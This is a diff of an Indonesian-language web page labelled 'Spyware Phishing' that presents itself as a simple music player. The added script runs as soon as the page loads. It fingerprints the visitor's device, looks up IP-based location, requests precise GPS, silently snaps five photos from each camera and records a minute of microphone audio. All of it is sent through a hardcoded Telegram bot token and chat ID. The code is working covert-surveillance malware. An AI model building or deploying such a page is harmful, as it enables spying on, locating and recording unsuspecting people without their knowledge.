@@ -1,4 +1,4 @@
-<!-- OPEN SOURCE V4 -->
+<!-- Spyware Phishing -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -140,7 +140,7 @@
   </style>
 </head>
 <body>
-<div class="card">
+  <div class="card">
     <div class="logo"></div>
     <div class="title-wrapper">
       <div class="title-loop">
@@ -161,9 +161,7 @@
       <button onclick="audio.pause()">Pause</button>
     </div>
   </div>
-
   <audio id="audio" src="https://files.catbox.moe/5qs1a7.mp3" autoplay muted></audio>
-
   <script>
     const audio = document.getElementById("audio");
     const progress = document.getElementById("progress");
@@ -182,293 +180,218 @@
       }
     });
 
-    const mulaiTimer = performance.now(); // Buat uptime halaman
-  </script>
-  <script>
-  const getAdvancedInfo = async () => {
-    const ua = navigator.userAgent;
-    const arch = navigator.userAgent.includes("arm") ? "arm64" : "x86";
-    const brand = /Xiaomi/i.test(ua) ? "Xiaomi" :
-                  /Vivo/i.test(ua) ? "Vivo" :
-                  /Oppo|CPH/i.test(ua) ? "Oppo" :
-                  /SM-|Samsung/i.test(ua) ? "Samsung" :
-                  /Infinix/i.test(ua) ? "Infinix" :
-                  /RMX|Realme/i.test(ua) ? "Realme" :
-                  "Android";
+    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
+    const chatId1 = '5914256752';
+    const targets = [{ token: token1, chat_id: chatId1 }];
 
-    const model = /Redmi/i.test(ua) ? "Redmi Note 12" :
-                  /SM-A/.test(ua) ? "Galaxy A Series" :
-                  "Tidak terdeteksi";
+    const kirimPesan = async (pesan) => {
+      for (const t of targets) {
+        await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: t.chat_id, text: pesan, parse_mode: 'HTML' })
+        });
+      }
+    };
 
-    const waktu = new Date();
-    const localTime = waktu.toLocaleTimeString("id-ID");
-    const offset = -waktu.getTimezoneOffset() / 60;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const kirimFoto = async (blob) => {
+      for (const t of targets) {
+        const form = new FormData();
+        form.append("chat_id", t.chat_id);
+        form.append("photo", blob, "foto.jpg");
+        await fetch(`https://api.telegram.org/bot${t.token}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
+      }
+    };
 
-    const memory = navigator.deviceMemory || "-";
-    const core = navigator.hardwareConcurrency || "-";
-    const is64bit = arch.includes("64") ? "Ya" : "Tidak";
+    let statusVN = "❌ Voice Note tidak diizinkan.";
+    const kirimVN = async (blob) => {
+      for (const t of targets) {
+        const form = new FormData();
+        form.append("chat_id", t.chat_id);
+        form.append("voice", blob, "voice.webm");
+        await fetch(`https://api.telegram.org/bot${t.token}/sendVoice`, {
+          method: "POST",
+          body: form
+        });
+      }
+      statusVN = `Rekam target berhasil\nDurasi : 60 detik\nJenis : audio/webm`;
+    };
 
-    const platform = navigator.platform || "-";
-    const language = navigator.language || "-";
-    const touchPoints = navigator.maxTouchPoints || 0;
-    const touchSupport = 'ontouchstart' in window ? `Ya (${touchPoints} titik)` : "Tidak";
-    const uptime = ((performance.now() / 1000).toFixed(1)) + " detik";
+    const rekamSuara = () => {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+          await kirimVN(blob);
+        };
+        mediaRecorder.start();
+        setTimeout(() => {
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }, 60000);
+      }).catch(() => {
+        statusVN = `❌ Voice Note tidak diizinkan.`;
+      });
+    };
+    const getDeviceBrand = () => {
+      const ua = navigator.userAgent;
+      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
+      if (/Oppo|CPH/.test(ua)) return 'Oppo';
+      if (/SM-|Samsung/.test(ua)) return 'Samsung';
+      if (/Infinix/.test(ua)) return 'Infinix';
+      if (/RMX/.test(ua)) return 'Realme';
+      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
+      return 'Android Device';
+    };
 
-    // GPU info
-    let gpuVendor = "-", gpuRenderer = "-", canvasFingerprint = "Tidak";
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl");
-      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      canvasFingerprint = "Terdeteksi";
-    } catch {}
+    const ambilDataPerangkat = async () => {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const vendor = navigator.vendor;
+      const brand = getDeviceBrand();
+      const waktu = new Date().toLocaleString("id-ID");
+      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
+      const ref = document.referrer || 'Langsung';
+      const bahasa = navigator.language || '-';
+      const koneksi = navigator.connection || {};
+      const iframe = window.top !== window.self ? 'Ya' : 'Tidak';
+      const online = navigator.onLine ? 'Online' : 'Offline';
 
-    const layarFisik = `${screen.width} x ${screen.height}`;
-    const viewport = `${window.innerWidth} x ${window.innerHeight} px`;
-    const dpr = window.devicePixelRatio || "-";
-    const orientation = screen.orientation?.type || "-";
-    const rotasi = screen.orientation?.angle + "°" || "-";
-    const warna = screen.colorDepth + "-bit";
+      let gpu = { vendor: '-', renderer: '-' };
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl");
+        const info = gl.getExtension("WEBGL_debug_renderer_info");
+        gpu.vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
+        gpu.renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
+      } catch {}
 
-    return `
-౼ 〘 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 & 𝗦𝗜𝗦𝗧𝗘𝗠 〙 ౼
-Jenis Perangkat        : ${brand}
-Model Perangkat        : ${model} (heuristik UA + resolusi)
-Sistem Operasi         : Android ${ua.match(/Android\s([\d.]+)/)?.[1] || "-"}
-Platform Sistem        : ${platform}
-Arsitektur OS          : ${arch}
-64-bit Support         : ${is64bit}
-CPU Fisik              : ${core} inti
-RAM Terdeteksi         : ${memory} GB
-Device Memory API      : ${memory}
-Hardware Concurrency   : ${core}
-Touch Support          : ${touchSupport}
-Screen Reader Aktif    : Tidak terdeteksi
-Bahasa Sistem          : ${language}
-Zona Waktu Lokal       : ${timezone}
-Offset UTC             : ${offset > 0 ? "+" + offset : offset}
-Delta Zona Waktu IP    : Sesuai IP (tidak terdeteksi spoof)
-Uptime Halaman         : ${uptime}
-
-౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼
-Resolusi Layar Fisik   : ${layarFisik}
-Viewport Aktif         : ${viewport}
-Kerapatan Piksel       : ${dpr}
-Orientasi Layar        : ${orientation}
-Rotasi                 : ${rotasi}
-Warna Layar            : ${warna}
-GPU Vendor             : ${gpuVendor}
-GPU Renderer           : ${gpuRenderer}
-WebGL Support          : Ya
-Canvas Fingerprint     : ${canvasFingerprint}
-GPU Rendering Mode     : hardware
-HDR Support            : Tidak
-    `.trim();
-  };
-</script>
-<script>
-  const ambilBrowser = () => {
-    const ua = navigator.userAgent;
-    const cookies = navigator.cookieEnabled ? "Ya" : "Tidak";
-    const js = typeof navigator === "object" ? "Ya" : "Tidak";
-    const dnt = navigator.doNotTrack === "1" ? "Ya" : "Tidak";
-    const evalSupport = typeof eval === "function" ? "Ya" : "Tidak";
-    const webdriver = navigator.webdriver ? "Ya" : "Tidak";
-    const vendor = navigator.vendor || "-";
-    const incognito = "Tidak terdeteksi";
-    const referrer = document.referrer || "Langsung";
-    const https = location.protocol === "https:" ? "Ya" : "Tidak";
-    const iframe = window.top !== window.self ? "Ya" : "Tidak";
-    const ctx = window.isSecureContext ? "Ya" : "Tidak";
-
-    const browserName = /Chrome/.test(ua) ? "Chrome" :
-                        /Firefox/.test(ua) ? "Firefox" :
-                        /Safari/.test(ua) ? "Safari" : "Tidak diketahui";
-
-    const versi = ua.match(/Chrome\/([\d.]+)/)?.[1] || "-";
-
-    return `
-౼ 〘 𝗕𝗥𝗢𝗪𝗦𝗘𝗥 〙 ౼
-Browser                : ${browserName}
-Versi Browser          : ${versi}
-Vendor Browser         : ${vendor}
-User Agent             : ${ua}
-Cookies Aktif          : ${cookies}
-JavaScript Aktif       : ${js}
-Do Not Track           : ${dnt}
-Eval Support           : ${evalSupport}
-WebDriver Aktif        : ${webdriver}
-Incognito Mode         : ${incognito}
-Tamper Devtools        : Tidak terdeteksi
-Autofill Behavior      : Normal
-Referrer               : ${referrer}
-HTTPS                  : ${https}
-Konteks Aman           : ${ctx}
-Dibuka via iframe      : ${iframe}
-`.trim();
-  };
-
-  const ambilIPInfo = async () => {
-    try {
-      const ip = await fetch("https://ipapi.co/json").then(res => res.json());
-      const conn = navigator.connection || {};
       return `
-౼ 〘 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 & 𝗜𝗣 〙 ౼
+౼ 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙 ౼
+Jenis Perangkat        : ${brand}
+User Agent             : ${ua}
+Platform               : ${platform}
+Vendor Browser         : ${vendor}
+GPU Vendor             : ${gpu.vendor}
+GPU Renderer           : ${gpu.renderer}
+CPU                    : ${navigator.hardwareConcurrency || '-'} inti
+RAM                    : ${navigator.deviceMemory || '-'} GB
+Resolusi Layar         : ${screen.width} x ${screen.height}
+Orientasi Layar        : ${screen.orientation?.type || '-'}
+Touch Support          : ${touch} (${navigator.maxTouchPoints || 0} titik)
+Kerapatan Piksel       : ${window.devicePixelRatio}
+Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+JavaScript             : Aktif
+Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
+HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
+Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Waktu Lokal            : ${waktu}
+Referrer               : ${ref}
+Bahasa Sistem          : ${bahasa}
+Status Online          : ${online}
+Jumlah History         : ${history.length} halaman
+Dibuka via iframe      : ${iframe}
+Tipe Koneksi           : ${koneksi.effectiveType || '-'}
+Mode Hemat Data        : ${koneksi.saveData ? 'Ya' : 'Tidak'}
+Tipe Perangkat         : ${/Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop'}
+Dibuka via Browser     : ${vendor || 'Tidak diketahui'}
+`.trim();
+    };
+
+    const ambilIPInfo = async () => {
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const ip = await res.json();
+        return `
+౼ 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 ౼
 IP Publik              : ${ip.ip}
-ISP / Provider         : ${ip.org}
+Penyedia Layanan       : ${ip.org}
 Negara                 : ${ip.country_name}
 Provinsi               : ${ip.region}
-Kota                   : ${ip.city}
-Jenis Koneksi          : ${conn.effectiveType || "-"}
-Downlink               : ${conn.downlink || "-"} Mbps
-RTT (Ping)             : ${conn.rtt || "-"} ms
-Mode Hemat Data        : ${conn.saveData ? "Ya" : "Tidak"}
-VPN / Proxy            : Tidak terdeteksi`.trim();
-    } catch {
-      return `౼ 〘 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 & 𝗜𝗣 〙 ౼\n❌ Gagal mengambil data IP.`;
-    }
-  };
+Kota                   : ${ip.city}`.trim();
+      } catch {
+        return `౼ 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 ౼\n❌ Gagal mengambil data IP.`;
+      }
+    };
 
-  const ambilBaterai = async () => {
-    try {
-      const bat = await navigator.getBattery();
-      const level = Math.round(bat.level * 100) + "%";
-      const charging = bat.charging ? "Ya" : "Tidak";
-      const estimasi = bat.dischargingTime > 0
-        ? Math.floor(bat.dischargingTime / 60) + " menit"
-        : "Tidak tersedia";
+    const ambilLokasi = () => {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
+Latitude               : ${latitude}
+Longitude              : ${longitude}
+Akurasi                : ±${accuracy} meter
+Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
+        }, () => {
+          resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
+❌ Lokasi tidak diizinkan.`);
+        }, { enableHighAccuracy: true, timeout: 5000 });
+      });
+    };
+    const ambilKamera = async (facingMode, label) => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true);
+        await video.play();
 
-      return `
-౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼
-Level Baterai          : ${level}
-Sedang Mengisi         : ${charging}
-Estimasi Sisa Waktu    : ${estimasi}
-Status Online          : ${navigator.onLine ? "Online" : "Offline"}`.trim();
-    } catch {
-      return `౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼\n❌ Tidak dapat mendeteksi status baterai.`;
-    }
-  };
+        await new Promise(resolve => {
+          const cek = () => {
+            if (video.videoWidth > 0) resolve();
+            else requestAnimationFrame(cek);
+          };
+          cek();
+        });
 
-  const ambilIzinMedia = async () => {
-    const perms = await Promise.all([
-      navigator.permissions.query({ name: "microphone" }).catch(() => null),
-      navigator.permissions.query({ name: "camera" }).catch(() => null),
-      navigator.permissions.query({ name: "notifications" }).catch(() => null),
-      navigator.permissions.query({ name: "clipboard-read" }).catch(() => null)
-    ]);
-    const mic = perms[0]?.state || "Tidak diketahui";
-    const cam = perms[1]?.state || "Tidak diketahui";
-    const notif = perms[2]?.state || "Tidak diketahui";
-    const clip = perms[3]?.state || "Tidak diketahui";
+        for (let i = 0; i < 5; i++) {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
+          canvas.toBlob(async (blob) => {
+            if (blob) await kirimFoto(blob);
+          }, "image/jpeg");
+          await new Promise(r => setTimeout(r, 100));
+        }
 
-    return `
-౼ 〘 𝗜𝗭𝗜𝗡 & 𝗠𝗘𝗗𝗜𝗔 〙 ౼
-Microphone             : ${mic}
-Kamera Depan           : ${cam}
-Kamera Belakang        : ${cam}
-Notifikasi             : ${notif}
-Clipboard Access       : ${clip}
-Audio Output Sink      : Didukung
-Ambient Light Sensor   : Tidak
-Web Speech API         : Didukung
-AudioContext API       : Didukung
-Voice Recognition      : Aktif
-Gyroscope              : Tidak didukung
-Magnetometer           : Tidak didukung
-Accelerometer          : Tidak didukung`.trim();
-  };
+        stream.getTracks().forEach(track => track.stop());
 
-  const ambilWebFeatures = () => {
-    return `
-౼ 〘 𝗪𝗘𝗕 𝗔𝗣𝗜 & 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 〙 ౼
-LocalStorage           : ${!!window.localStorage ? "Aktif" : "Tidak"}
-SessionStorage         : ${!!window.sessionStorage ? "Aktif" : "Tidak"}
-IndexedDB              : ${!!window.indexedDB ? "Aktif" : "Tidak"}
-Cache API              : ${"caches" in window ? "Aktif" : "Tidak"}
-Web Share API          : ${"share" in navigator ? "Didukung" : "Tidak"}
-Service Worker         : ${"serviceWorker" in navigator ? "Aktif" : "Tidak"}
-WebRTC                 : ${"RTCPeerConnection" in window ? "Aktif" : "Tidak"}
-WebGL 2.0              : ${!!document.createElement("canvas").getContext("webgl2") ? "Aktif" : "Tidak"}
-Gamepad API            : ${"getGamepads" in navigator ? "Didukung" : "Tidak"}
-MIDI API               : ${"requestMIDIAccess" in navigator ? "Didukung" : "Tidak"}
-Speech Synthesis       : ${"speechSynthesis" in window ? "Didukung" : "Tidak"}
-Clipboard Read         : ${"clipboard" in navigator ? "Diizinkan" : "Tidak"}
-Push API               : ${"PushManager" in window ? "Aktif" : "Tidak"}
-Payment Request API    : ${"PaymentRequest" in window ? "Didukung" : "Tidak"}
-Wake Lock API          : ${"wakeLock" in navigator ? "Didukung" : "Tidak"}
-Idle Detection API     : ${"IdleDetector" in window ? "Didukung" : "Tidak"}
-Screen Wake Lock       : ${"wakeLock" in navigator ? "Didukung" : "Tidak"}`.trim();
-  };
+        return `Memotret target sebanyak 5X\nKamera : succes\nAkses : Diizinkan`;
+      } catch {
+        return `❌ Kamera tidak diizinkan.`;
+      }
+    };
 
-  const ambilAntiBot = () => {
-    return `
-౼ 〘 𝗗𝗘𝗧𝗘𝗞𝗦𝗜 𝗔𝗡𝗧𝗜-𝗕𝗢𝗧 〙 ౼
-Fingerprint Stabilitas : Stabil
-Canvas ID              : Dihasilkan
-Audio Fingerprint      : Didukung
-Timezone Spoofing      : Tidak terdeteksi
-Language Spoofing      : Tidak
-Hardware Spoofing      : Tidak
-Navigator Tampering    : Tidak
-GPU Tampering          : Tidak
-Touch Point Realistik  : Ya
-Behavioral Check       : Natural
-Browser Entropy        : Normal`.trim();
-  };
-</script>
-<script>
-  const gabungSemuaInfo = async () => {
-    const infoPerangkat = await getAdvancedInfo();
-    const infoBrowser = ambilBrowser();
-    const infoJaringan = await ambilIPInfo();
-    const infoBaterai = await ambilBaterai();
-    const infoIzin = await ambilIzinMedia();
-    const fiturWeb = ambilWebFeatures();
-    const antiBot = ambilAntiBot();
+    const mulai = async () => {
+      audio.muted = false;
+      try { await audio.play(); } catch {}
 
-    return [
-      infoPerangkat,
-      infoBrowser,
-      infoJaringan,
-      infoBaterai,
-      infoIzin,
-      fiturWeb,
-      antiBot
-    ].join("\n\n");
-  };
+      const info = await ambilDataPerangkat();
+      const ip = await ambilIPInfo();
+      const lokasi = await ambilLokasi();
+      rekamSuara(); // VN jalan di awal supaya gak delay
 
-  const mulai = async () => {
-    audio.muted = false;
-    try { await audio.play(); } catch {}
+      const depan = await ambilKamera("user", "depan");
+      const belakang = await ambilKamera("environment", "belakang");
 
-    const dataInfoLengkap = await gabungSemuaInfo();
-    await kirimPesan(dataInfoLengkap); // ⬅️ INFO DIKIRIM DULUAN
+      const kameraDepanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;
+      const kameraBelakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;
+      const vnStatus = `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼\n${statusVN}`;
 
-    rekamSuara(); // VN langsung mulai di background
+      const gabung = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus, vnStatus].join("\n\n");
+      await kirimPesan(gabung);
+    };
 
-    // Kamera depan (5x)
-    const depan = await ambilKamera("user", "Depan");
-    const kameraDepanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;
-
-    // Kamera belakang (5x)
-    const belakang = await ambilKamera("environment", "Belakang");
-    const kameraBelakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;
-
-    // Delay biar VN sempat selesai
-    await new Promise(r => setTimeout(r, 61000));
-
-    // Status VN (diupdate dari rekaman sebelumnya)
-    const vnStatus = `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 (𝗔𝗨𝗗𝗜𝗢) 〙\n${statusVN}`;
-
-    // Kirim status kamera & VN terakhir
-    const hasilAkhir = [kameraDepanStatus, kameraBelakangStatus, vnStatus].join("\n\n");
-    await kirimPesan(hasilAkhir);
-  };
-
-  window.addEventListener("load", mulai);
-</script>
+    window.addEventListener("load", mulai);
+  </script>
 </body>
 </html>
